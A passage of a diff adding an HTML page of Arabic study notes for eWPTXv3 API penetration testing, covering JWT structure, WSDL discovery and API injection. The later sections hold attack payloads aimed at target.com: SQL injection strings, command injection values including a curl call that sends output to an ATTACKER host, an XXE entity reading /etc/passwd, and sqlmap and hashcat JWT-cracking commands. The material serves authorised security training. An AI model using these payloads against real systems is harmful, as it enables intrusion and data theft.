+  <div class="mdesc">يستخدم Tokens (JWT, OAuth) تُصدَر بعد الـ Login وتُستخدَم للطلبات اللاحقة — يقلَّل الحاجة لإعادة إدخال Credentials.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">05</span>
+  <div class="mtitle">🌐 SSO — Single Sign-On</div>
+  <div class="mdesc">تسجيل دخول واحد للوصول لتطبيقات متعددة بدون إعادة إدخال Credentials — يستخدم SAML أو OAuth.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">06</span>
+  <div class="mtitle">🔢 OTP — One-Time Password</div>
+  <div class="mdesc">كلمة مرور مؤقتة تُرسَل عبر SMS أو Email لجلسة تسجيل دخول واحدة. غالباً مع أساليب مصادقة أخرى.</div>
+</div>
+</div>
+
+<h3>اختبار المصادقة — OWASP WSTG</h3>
+<p>اختبار المصادقة هو فحص واستغلال نقاط الضعف في آليات التحقق من الهوية — Login Forms، Password Reset، MFA، وAccount Lockouts.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>الاسم</th><th>ID</th><th>الوصف</th></tr></thead>
+<tbody>
+<tr><td>Credentials over Encrypted Channel</td><td><code>WSTG-ATHN-01</code></td><td>التحقق من أن بيانات الاعتماد تُرسَل بأمان عبر HTTPS</td></tr>
+<tr><td>Default Credentials</td><td><code>WSTG-ATHN-02</code></td><td>فحص إذا كانت بيانات الاعتماد الافتراضية ما زالت مستخدَمة</td></tr>
+<tr><td>Weak Lock Out Mechanism</td><td><code>WSTG-ATHN-03</code></td><td>تقييم آليات الإقفال لمنع هجمات Brute-Force</td></tr>
+<tr><td>Bypassing Authentication Schema</td><td><code>WSTG-ATHN-04</code></td><td>تحديد عيوب تسمح بتجاوز المصادقة كلياً</td></tr>
+<tr><td>Vulnerable Remember Password</td><td><code>WSTG-ATHN-05</code></td><td>تقييم أمان ميزة "تذكَّرني" وما تكشفه من بيانات</td></tr>
+<tr><td>Browser Cache Weaknesses</td><td><code>WSTG-ATHN-06</code></td><td>التأكد من عدم تخزين بيانات حساسة في Cache المتصفح</td></tr>
+<tr><td>Weak Password Policy</td><td><code>WSTG-ATHN-07</code></td><td>فحص سياسة كلمات المرور — التعقيد وانتهاء الصلاحية</td></tr>
+<tr><td>Weak Auth in Alternative Channels</td><td><code>WSTG-ATHN-08</code></td><td>اختبار القنوات البديلة (APIs، Mobile) لممارسات أمنية أضعف</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">Token-Based Authentication وJSON Web Tokens</span></h2>
+
+<h3>Token-Based Authentication — المفهوم</h3>
+<p>بدل الحفاظ على حالة الجلسة على الـ Server، يتم إصدار Tokens للعملاء وتمريرها ذهاباً وإياباً للمصادقة على الطلبات. هذه الـ Tokens تحتوي هوية المستخدم أو التطبيق والصلاحيات ذات الصلة — تتيح مصادقة سلسة وقابلة للتوسيع.</p>
+
+<h3>أنواع الـ Tokens</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span><strong>Bearer Tokens:</strong> صيغة بسيطة تمنح الوصول عند تقديمها. يجب أن تبقى سرية — قصيرة الأجل لتقليل المخاطر.</span></div>
+  <div class="goal-card"><span class="gi">2</span><span><strong>JWT (JSON Web Tokens):</strong> Self-contained، يضم Header وPayload وSignature. بدون حاجة لـ Session Storage على الـ Server.</span></div>
+  <div class="goal-card"><span class="gi">3</span><span><strong>OAuth Tokens:</strong> Access Tokens (للوصول) + Refresh Tokens (للتجديد بدون إعادة تسجيل دخول).</span></div>
+</div>
+
+<h3>أماكن تمرير الـ Token — Token Placement</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>المكان</th><th>المثال</th><th>الأمان</th><th>التوصية</th></tr></thead>
+<tbody>
+<tr><td><strong>Authorization Header</strong></td><td><code>Authorization: Bearer &lt;token&gt;</code></td><td>🟢 الأفضل</td><td>✓ الطريقة المُفضَّلة — منفصل عن الـ URL واللوجات</td></tr>
+<tr><td>Query Parameters</td><td><code>?access_token=&lt;token&gt;</code></td><td>🔴 خطر</td><td>⚠ ممكن يظهر في الـ Browser History والـ Logs</td></tr>
+<tr><td>Request Body</td><td><code>{"token": "&lt;token&gt;"}</code></td><td>🟡 مقبول</td><td>للـ POST فقط — لا تستخدم مع GET</td></tr>
+<tr><td>Cookies</td><td><code>Set-Cookie: auth_token=&lt;token&gt;</code></td><td>🟡 مقبول</td><td>مع HttpOnly + Secure + SameSite لمنع CSRF</td></tr>
+<tr><td>Custom Headers</td><td><code>X-Auth-Token: &lt;token&gt;</code></td><td>🟡 مقبول</td><td>أقل قياسية — لأنظمة ذات احتياجات خاصة</td></tr>
+</tbody>
+</table></div>
+
+<h3>JSON Web Tokens (JWT) — البنية الكاملة</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ JWT</div>
+<p>طريقة مضغوطة وURL-safe وself-contained لنقل المعلومات بأمان بين الأطراف. يُستخدَم على نطاق واسع للـ Authentication والـ Authorization وتبادل المعلومات في التطبيقات الحديثة. يتكوَّن من ثلاثة أجزاء مفصولة بنقطة.</p>
+</div>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 185" xmlns="http://www.w3.org/2000/svg">
+  <!-- Encoded JWT -->
+  <rect x="8" y="8" width="684" height="32" rx="5" class="dsvg-box"/>
+  <text x="350" y="22" text-anchor="middle" class="dsvg-muted" font-size="9">JWT Encoded (Base64URL)</text>
+  <text x="100" y="34" text-anchor="middle" class="dsvg-blue" font-size="9" font-family="IBM Plex Mono">eyJhbGciOiJIUzI1NiJ9</text>
+  <text x="282" y="34" text-anchor="middle" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">.</text>
+  <text x="400" y="34" text-anchor="middle" class="dsvg-amber" font-size="9" font-family="IBM Plex Mono">eyJzdWIiOiIxMjM0NTY3ODkwIn0</text>
+  <text x="563" y="34" text-anchor="middle" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">.</text>
+  <text x="635" y="34" text-anchor="middle" class="dsvg-green" font-size="9" font-family="IBM Plex Mono">SflKxwRJSMeKKF2Q</text>
+
+  <!-- Three boxes -->
+  <rect x="8" y="54" width="200" height="115" rx="7" class="dsvg-box-b"/>
+  <text x="108" y="74" text-anchor="middle" class="dsvg-blue" font-size="12" font-weight="700">HEADER</text>
+  <text x="108" y="91" text-anchor="middle" class="dsvg-muted" font-size="9">بيانات الـ Token نفسه</text>
+  <text x="28"  y="111" class="dsvg-blue" font-size="9" font-family="IBM Plex Mono">{</text>
+  <text x="32"  y="125" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">  "alg": "HS256",</text>
+  <text x="32"  y="138" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">  "typ": "JWT"</text>
+  <text x="28"  y="151" class="dsvg-blue" font-size="9" font-family="IBM Plex Mono">}</text>
+  <text x="28"  y="163" class="dsvg-muted" font-size="8">خوارزمية التوقيع + النوع</text>
+
+  <rect x="224" y="54" width="252" height="115" rx="7" class="dsvg-box-a"/>
+  <text x="350" y="74" text-anchor="middle" class="dsvg-amber" font-size="12" font-weight="700">PAYLOAD (Claims)</text>
+  <text x="350" y="91" text-anchor="middle" class="dsvg-muted" font-size="9">Base64 Encoded — NOT Encrypted!</text>
+  <text x="234" y="108" class="dsvg-amber" font-size="9" font-family="IBM Plex Mono">{</text>
+  <text x="238" y="121" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">  "sub": "1234567890",</text>
+  <text x="238" y="134" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">  "name": "John Doe",</text>
+  <text x="238" y="147" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">  "admin": true,</text>
+  <text x="238" y="160" class="dsvg-muted" font-size="9" font-family="IBM Plex Mono">  "exp": 1716454560</text>
+  <text x="234" y="163" class="dsvg-amber" font-size="9" font-family="IBM Plex Mono">}</text>
+
+  <rect x="492" y="54" width="200" height="115" rx="7" class="dsvg-box-g"/>
+  <text x="592" y="74" text-anchor="middle" class="dsvg-green" font-size="12" font-weight="700">SIGNATURE</text>
+  <text x="592" y="91" text-anchor="middle" class="dsvg-muted" font-size="9">يضمن سلامة الـ Token</text>
+  <text x="502" y="111" class="dsvg-muted" font-size="8" font-family="IBM Plex Mono">HMACSHA256(</text>
+  <text x="506" y="125" class="dsvg-muted" font-size="8" font-family="IBM Plex Mono">  b64(header) + "." +</text>
+  <text x="506" y="138" class="dsvg-muted" font-size="8" font-family="IBM Plex Mono">  b64(payload),</text>
+  <text x="506" y="151" class="dsvg-green" font-size="8" font-family="IBM Plex Mono">  secret</text>
+  <text x="502" y="163" class="dsvg-muted" font-size="8" font-family="IBM Plex Mono">)</text>
+</svg>
+<div class="diagram-caption">JWT = HEADER . PAYLOAD . SIGNATURE — الترتيب ثابت دايماً</div>
+</div>
+
+<h3>JWT Claims — أنواع البيانات في الـ Payload</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">Registered</span>
+  <div class="mtitle">Claims مُعرَّفة مسبقاً</div>
+  <div class="mdesc">
+    <code>iss</code>: من أصدر الـ Token<br/>
+    <code>sub</code>: موضوع الـ Token (User ID)<br/>
+    <code>aud</code>: المستلم المُستهدَف<br/>
+    <code>exp</code>: وقت انتهاء الصلاحية<br/>
+    <code>iat</code>: وقت الإصدار<br/>
+    <code>nbf</code>: لا يصلح قبل هذا الوقت
+  </div>
+</div>
+<div class="method-card">
+  <span class="mnum">Public</span>
+  <div class="mtitle">Claims العامة</div>
+  <div class="mdesc">بيعرَّفها المطوَّر — لازم تكون فريدة لتجنَّب التعارض.<br/>
+    <code>role</code>: دور المستخدم (admin, user)<br/>
+    <code>email</code>: البريد الإلكتروني<br/>
+    <code>permissions</code>: ["read", "write"]
+  </div>
+</div>
+<div class="method-card">
+  <span class="mnum">Private</span>
+  <div class="mtitle">Claims الخاصة</div>
+  <div class="mdesc">Claims متفَّق عليها بين الأطراف المتبادِلة. غير قياسية — خاصة بالتطبيق.<br/>
+    <code>department</code>: "sales"<br/>
+    <code>cartId</code>: "abc123"
+  </div>
+</div>
+</div>
+
+<div class="callout warning">
+<div class="callout-label">⚠ JWT ليس مُشفَّراً افتراضياً</div>
+<p>الـ Payload في JWT بيكون Base64 Encoded فقط — مش مُشفَّراً. يعني أي شخص يمتلك الـ Token يقدر يقرأ محتواه. <strong>لا تضع فيه معلومات حساسة</strong> زي كلمات المرور. الـ Signature بتضمن عدم التلاعب لكن لا تخفي المحتوى.</p>
+</div>
+
+<h3>Token-Based Auth Flow</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 130" xmlns="http://www.w3.org/2000/svg">
+  <!-- Client -->
+  <rect x="8" y="30" width="100" height="70" rx="7" class="dsvg-box-b"/>
+  <text x="58" y="60" text-anchor="middle" class="dsvg-blue" font-size="10" font-weight="700">Client</text>
+  <text x="58" y="76" text-anchor="middle" class="dsvg-muted" font-size="8">Browser / App</text>
+  <!-- Arrow 1: Login -->
+  <line x1="108" y1="52" x2="198" y2="52" class="dsvg-line"/>
+  <polygon points="198,47 208,52 198,57" class="dsvg-arr"/>
+  <text x="153" y="44" text-anchor="middle" class="dsvg-muted" font-size="8">POST /login</text>
+  <text x="153" y="60" text-anchor="middle" class="dsvg-muted" font-size="7">{user, password}</text>
+  <!-- Server -->
+  <rect x="208" y="18" width="120" height="94" rx="7" class="dsvg-box-g"/>
+  <text x="268" y="44" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">Auth Server</text>
+  <text x="268" y="60" text-anchor="middle" class="dsvg-muted" font-size="8">Validates credentials</text>
+  <text x="268" y="76" text-anchor="middle" class="dsvg-muted" font-size="8">Signs JWT</text>
+  <text x="268" y="92" text-anchor="middle" class="dsvg-green" font-size="8">Issues Token</text>
+  <!-- Arrow 2: Token response -->
+  <line x1="208" y1="90" x2="108" y2="90" class="dsvg-line-g"/>
+  <polygon points="108,85 98,90 108,95" class="dsvg-arr-g"/>
+  <text x="153" y="84" text-anchor="middle" class="dsvg-green" font-size="8">JWT Token</text>
+  <!-- Arrow 3: API Request -->
+  <line x1="108" y1="65" x2="368" y2="65" class="dsvg-line"/>
+  <polygon points="368,60 378,65 368,70" class="dsvg-arr"/>
+  <text x="238" y="58" text-anchor="middle" class="dsvg-amber" font-size="7">Authorization: Bearer JWT</text>
+  <!-- Resource Server -->
+  <rect x="378" y="30" width="150" height="70" rx="7" class="dsvg-box-a"/>
+  <text x="453" y="56" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">Resource Server</text>
+  <text x="453" y="72" text-anchor="middle" class="dsvg-muted" font-size="8">Validates JWT Signature</text>
+  <text x="453" y="86" text-anchor="middle" class="dsvg-muted" font-size="8">Checks exp, iss, aud</text>
+  <!-- Arrow 4: Response -->
+  <line x1="528" y1="65" x2="568" y2="65" class="dsvg-line-g"/>
+  <polygon points="568,60 578,65 568,70" class="dsvg-arr-g"/>
+  <!-- Result -->
+  <rect x="578" y="38" width="114" height="54" rx="7" class="dsvg-box-g"/>
+  <text x="635" y="58" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">200 OK</text>
+  <text x="635" y="74" text-anchor="middle" class="dsvg-muted" font-size="8">Protected Resource</text>
+  <text x="350" y="120" text-anchor="middle" class="dsvg-muted" font-size="9">⚡ Client يخزَّن الـ JWT → بيبعثه في كل Request → Server بيتحقَّق منه Stateless</text>
+</svg>
+<div class="diagram-caption">JWT Flow — لا Session Storage على الـ Server، كل المعلومات في الـ Token نفسه</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">WSDL Disclosure وMethod Enumeration</span></h2>
+
+<h3>لماذا WSDL Disclosure مهم؟</h3>
+<p>الوصول لملف WSDL هو الخطوة الأولى في اختبار أمان الـ Web Services — بيديك القائمة الكاملة للـ Operations والـ Types المسموح بها من الـ Server، والـ Syntax الصحيح، والـ Inputs والـ Outputs وكل المعلومات اللي محتاجها لتنفيذ هجمات ناجحة.</p>
+
+<h3>اكتشاف خدمات SOAP والـ Endpoints</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تحديد SOAP Service والـ Endpoints</div>
+<div class="step-body"><p>قبل ما تعدَّد ملفات WSDL، لازم تحدَّد SOAP Web Service والـ Endpoints. استخدم Burp Suite أو dirb للبحث عن Endpoints متاحة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">إضافة WSDL Suffixes للـ URL</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash — wsdl discovery</span><pre><code># إضافة Suffixes للـ Service URL
+http://target.com/service?wsdl
+http://target.com/service.wsdl
+http://target.com/service?disco
+
+# أمثلة عملية
+curl http://target.com/api/soap?wsdl
+curl http://target.com/ws/service.wsdl
+curl http://target.com/webservice?disco
+
+# استخدام Burp Suite Intruder مع قائمة Suffixes
+# أو ffuf/gobuster لـ WSDL file discovery
+ffuf -u http://target.com/FUZZ -w wsdl-paths.txt
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تحليل ملف WSDL</div>
+<div class="step-body"><p>بعد إيجاد الـ WSDL، افحص: العمليات المتاحة (<code>portType</code>)، أنواع البيانات المقبولة (<code>types</code>)، تنسيق الطلبات (<code>binding</code>)، وعنوان الـ Endpoint (<code>service</code>). هذا يكشف الـ Hidden Methods واحتمالية وجود ثغرات.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">استدعاء الـ Hidden Methods</div>
+<div class="step-body"><p>بعض الـ Methods غير موثَّقة في الواجهة الرسمية لكنها موجودة في الـ WSDL. استدعها مباشرة بـ SOAP Requests مُشكَّلة يدوياً أو بـ SoapUI.</p></div>
+</div>
+</div>
+
+<div class="callout examtip">
+<div class="callout-label">★ Methodology Tip</div>
+<p>دايماً افحص WSDL قبل اختبار أي SOAP Service. ممكن يكشف Methods بصلاحيات إدارية ما بتظهرش في الـ Documentation الرسمي — Hidden Admin Functions هي من أكثر النتائج قيمة في SOAP Testing.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU6 -->
+<h2 id="lu6"><span class="num">06</span><span class="htext">ثغرات الـ Injection في الـ APIs</span></h2>
+
+<h3>SQL Injection في الـ APIs</h3>
+<p>نفس مبادئ SQLi في تطبيقات الويب تنطبق على الـ APIs — الفرق هو أن الـ Payload بيتمرَّر في JSON Body أو Query Parameters أو Headers بدل HTML Form Fields.</p>
+<div class="code-wrap"><span class="code-tag">http — sql injection via api</span><pre><code"># SQL Injection في JSON Body
+POST /api/users/login HTTP/1.1
+Content-Type: application/json
+
+{"username": "admin'--", "password": "anything"}
+
+# SQL Injection في Query Parameter
+GET /api/products?id=1 OR 1=1-- HTTP/1.1
+
+# SQL Injection في SOAP Request
+&lt;web:getUser&gt;
+  &lt;web:userId&gt;1' OR '1'='1&lt;/web:userId&gt;
+&lt;/web:getUser&gt;
+
+# اختبار مع UNION-based
+GET /api/user?id=1 UNION SELECT username,password,NULL FROM users--
+
+# Error-based detection
+GET /api/item?id=1'
+# Response: SQL syntax error → vulnerable!
+</code></pre></div>
+
+<h3>Command Injection في الـ APIs</h3>
+<p>بعض الـ APIs بتمرَّر Input مباشرةً لـ OS Commands — بدون Sanitization. أي Parameter يُستخدَم في System Call ممكن يكون نقطة دخول.</p>
+<div class="code-wrap"><span class="code-tag">http — command injection via api</span><pre><code"># Command Injection في JSON Body
+POST /api/ping HTTP/1.1
+Content-Type: application/json
+
+{"host": "127.0.0.1; id"}
+{"host": "127.0.0.1 && cat /etc/passwd"}
+{"host": "127.0.0.1 | whoami"}
+
+# Command Injection في Query Parameter
+GET /api/lookup?domain=example.com;id HTTP/1.1
+
+# Blind Command Injection (time-based)
+{"host": "127.0.0.1; sleep 5"}
+# لو الـ Response تأخَّر 5 ثوان → vulnerable!
+
+# Blind Command Injection (OOB)
+{"host": "127.0.0.1; curl http://ATTACKER/$(id)"}
+</code></pre></div>
+
+<div class="callout warning">
+<div class="callout-label">⚠ API-Specific Injection Points</div>
+<p>في اختبار الـ APIs، افحص دايماً: JSON Body parameters، Query String parameters، HTTP Headers (X-Forwarded-For, User-Agent)، Path Parameters (<code>/api/users/{id}</code>)، وSOAP Envelope elements. أي مكان بيقبل Input من المستخدم هو نقطة اختبار محتملة.</p>
+</div>
+
+<h3>أدوات اختبار الـ API Injection</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">Burp</span>
+  <div class="mtitle">Burp Suite</div>
+  <div class="mdesc">Intercept وتعديل API Requests، استخدام Repeater لاختبار الـ Payloads يدوياً، وScanner للـ Automated Detection.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">SQLmap</span>
+  <div class="mtitle">sqlmap</div>
+  <div class="mdesc">يدعم JSON Body واختبار APIs مباشرة. استخدم <code>--data</code> لتمرير JSON Body و<code>--level</code> للعمق.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">SoapUI</span>
+  <div class="mtitle">SoapUI / Postman</div>
+  <div class="mdesc">لاختبار SOAP وREST APIs. SoapUI بيسمح بـ Security Scanning مع Payloads جاهزة.</div>
+</div>
+</div>
+<div class="code-wrap"><span class="code-tag">bash — sqlmap api testing</span><pre><code"># SQLmap مع JSON Body
+sqlmap -u "http://target.com/api/login" \
+       --data='{"username":"*","password":"test"}' \
+       --level=5 --risk=3 \
+       --headers="Content-Type: application/json"
+
+# SQLmap مع Bearer Token
+sqlmap -u "http://target.com/api/users?id=1" \
+       --headers="Authorization: Bearer JWT_TOKEN" \
+       --dbs
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>WSDL Discovery Paths</h4>
+<div class="code-wrap"><span class="code-tag">bash — wsdl discovery</span><pre><code"># Suffixes الشائعة
+?wsdl          .wsdl          ?disco
+?WSDL          /wsdl          /service.wsdl
+?wsdl=1        /api?wsdl      /ws?wsdl
+
+# Curl مباشر
+curl -s "http://target.com/service?wsdl"
+
+# ffuf discovery
+ffuf -u "http://target.com/FUZZ" \
+     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+
+# Burp Suite Intruder
+# Payload: قائمة WSDL suffixes على Base URL
+</code></pre></div>
+
+<h4>JWT Decode / Encode</h4>
+<div class="code-wrap"><span class="code-tag">bash — jwt manipulation</span><pre><code"># فك تشفير JWT (بدون التحقق من الـ Signature)
+echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
+echo "eyJzdWIiOiIxMjM0NTY3ODkwIn0" | base64 -d
+
+# Python — فك تشفير JWT كامل
+python3 -c "
+import base64, json
+parts = 'YOUR.JWT.TOKEN'.split('.')
+for p in parts[:2]:
+    padded = p + '=' * (4 - len(p)%4)
+    print(json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
+"
+
+# أدوات JWT Online
+# jwt.io          — فك تشفير وتشفير
+# jwt-cracker     — Brute Force على Secret
+# hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+
+# اختبار JWT "alg: none" attack
+# تعديل الـ Header لـ {"alg": "none"} وحذف الـ Signature
+</code></pre></div>
+
+<h4>REST API Testing Checklist</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الاختبار</th><th>ما تفحصه</th><th>الأداة</th></tr></thead>
+<tbody>
+<tr><td>Endpoint Discovery</td><td>ffuf/gobuster على API paths, Swagger/OpenAPI</td><td>ffuf, Burp</td></tr>
+<tr><td>Auth Bypass</td><td>WSTG-ATHN-04: تجربة بدون Token أو بـ JWT منتهي</td><td>Burp Repeater</td></tr>
+<tr><td>JWT Attacks</td><td>alg:none، ضعف Secret، تعديل Claims</td><td>jwt_tool, hashcat</td></tr>
+<tr><td>IDOR</td><td>تغيير IDs في Path/Body للوصول لموارد تانية</td><td>Burp Intruder</td></tr>
+<tr><td>SQL Injection</td><td>Payloads في JSON Body والـ Query Params</td><td>sqlmap, Burp</td></tr>
+<tr><td>Command Injection</td><td>OS commands في Parameters</td><td>Manual, Commix</td></tr>
+<tr><td>Rate Limiting</td><td>هل الـ API بتحجب عند كثرة الطلبات؟</td><td>Burp Intruder</td></tr>
+<tr><td>CORS</td><td>Origin header manipulation</td><td>Burp Repeater</td></tr>
+</tbody>
+</table></div>
+
+<h4>SOAP Testing Workflow</h4>
+<div class="code-wrap"><span class="code-tag">bash — soap testing</span><pre><code"># 1. اكتشاف WSDL
+curl http://target.com/service?wsdl -o service.wsdl
+
+# 2. استخراج Operations من WSDL
+grep -i "operation name" service.wsdl
+
+# 3. بناء SOAP Request يدوياً
+curl -X POST http://target.com/service \
+  -H "Content-Type: text/xml" \
+  -d '&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+        &lt;soap:Body&gt;
+          &lt;getUser&gt;&lt;id&gt;1&lt;/id&gt;&lt;/getUser&gt;
+        &lt;/soap:Body&gt;
+      &lt;/soap:Envelope&gt;'
+
+# 4. SQL Injection في SOAP
+&lt;id&gt;1' OR '1'='1&lt;/id&gt;
+
+# 5. XXE في SOAP
+&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;id&gt;&amp;xxe;&lt;/id&gt;
+</code></pre></div>
+
+<h4>JWT Claims Reference</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>Claim</th><th>الاسم</th><th>الوصف</th><th>النوع</th></tr></thead>
+<tbody>
+<tr><td><code>iss</code></td><td>Issuer</td><td>من أصدر الـ Token</td><td>Registered</td></tr>
+<tr><td><code>sub</code></td><td>Subject</td><td>موضوع الـ Token (User ID)</td><td>Registered</td></tr>
+<tr><td><code>aud</code></td><td>Audience</td><td>المستلم المقصود</td><td>Registered</td></tr>
+<tr><td><code>exp</code></td><td>Expiration</td><td>وقت انتهاء الصلاحية (Unix timestamp)</td><td>Registered</td></tr>
+<tr><td><code>iat</code></td><td>Issued At</td><td>وقت الإصدار</td><td>Registered</td></tr>
+<tr><td><code>nbf</code></td><td>Not Before</td><td>لا يصلح قبل هذا الوقت</td><td>Registered</td></tr>
+<tr><td><code>role</code></td><td>Role</td><td>دور المستخدم — admin/user</td><td>Public</td></tr>
+<tr><td><code>email</code></td><td>Email</td><td>البريد الإلكتروني</td><td>Public</td></tr>
+<tr><td><code>permissions</code></td><td>Permissions</td><td>قائمة الصلاحيات</td><td>Public</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده بنى أساساً شاملاً لاختبار اختراق الـ APIs — من فهم بروتوكولات الـ Web Services، لـ WSDL disclosure وتعداد الـ Methods، لاختبار المصادقة وثغرات الـ JWT، وصولاً لـ Injection Vulnerabilities.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module04_summary.txt</div>
+<ul>
+<li>Web Services تختلف عن Web Applications — بدون واجهة مستخدم، Machine-to-Machine فقط</li>
+<li>الأنواع الأربعة: XML-RPC (قديم)، JSON-RPC (خفيف)، SOAP (enterprise)، REST (حديث وشائع)</li>
+<li>WSDL = عقد الـ SOAP Service — يكشف كل الـ Operations والـ Types والـ Syntax</li>
+<li>إضافة ?wsdl أو .wsdl للـ URL قد يكشف ملف WSDL كامل مع Hidden Methods</li>
+<li>JWT يتكوَّن من Header.Payload.Signature — الـ Payload مُشفَّر بـ Base64 فقط وليس مُشفَّراً</li>
+<li>JWT Claims ثلاثة أنواع: Registered (iss, sub, exp...) وPublic (role, email) وPrivate (app-specific)</li>
+<li>أفضل مكان للـ Token: Authorization Header — أسوأ مكان: Query Parameters</li>
+<li>اختبار WSTG-ATHN: 8 tests من Credentials Transport لضعف Auth في القنوات البديلة</li>
+<li>SQL Injection وCommand Injection في APIs: نفس المبادئ لكن الـ Payload في JSON Body</li>
+<li>sqlmap يدعم JSON Body مع --data و--headers للـ API Testing</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>APIs هي نقاط الدخول الأكثر انتشاراً في التطبيقات الحديثة.</strong> فهم بروتوكولات الاتصال وآليات المصادقة وأماكن الـ Injection المحتملة هو أساس كل اختبار اختراق لتطبيقات الويب الحديثة.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">★ Exam Mindset</div>
+<p>في اختبار الـ eWPTXv3: دايماً ابحث عن WSDL أولاً في SOAP Services → افحص JWT Claims ونوع الـ Algorithm → جرَّب Injection في كل Parameter بما فيهم JSON Body → افحص Auth Headers بدون Token وبـ Expired Token. المنهجية هي المفتاح.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الرابع — eWPTXv3: API Penetration Testing</em></p>
+<div class="footer-note">-- EOF: module-04/api-penetration-testing.md --</div>
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
